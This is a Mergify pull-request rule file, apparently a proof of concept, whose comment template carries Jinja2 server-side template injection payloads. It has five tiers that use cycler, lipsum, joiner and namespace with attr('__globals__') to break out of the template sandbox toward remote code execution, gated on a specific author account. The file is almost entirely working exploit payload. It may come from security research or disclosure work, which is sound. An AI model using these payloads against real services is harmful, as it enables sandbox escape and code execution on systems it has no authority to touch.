pull_request_rules:
  - name: ssti-rce-poc
    conditions: []
    actions:
      comment:
        message: |
          === G4o7T SSTI RCE PoC ===
          author={{ author }}
          {% if author == 'mergify-account-B' %}
          [TIER1] cycler-via-set={% set x = cycler %}{{ x | attr('__globals__') }}
          [TIER2] lipsum-globals={{ lipsum | attr('__globals__') }}
          [TIER3] cycler-via-set-x={% set x = cycler %}{{ x }}
          [TIER4] joiner-call={% set j = joiner() %}{{ j | attr('__call__') | attr('__globals__') }}
          [TIER5] namespace-init={% set n = namespace %}{% set i = n.__init__ %}{{ i | attr('__globals__') }}
          {% endif %}
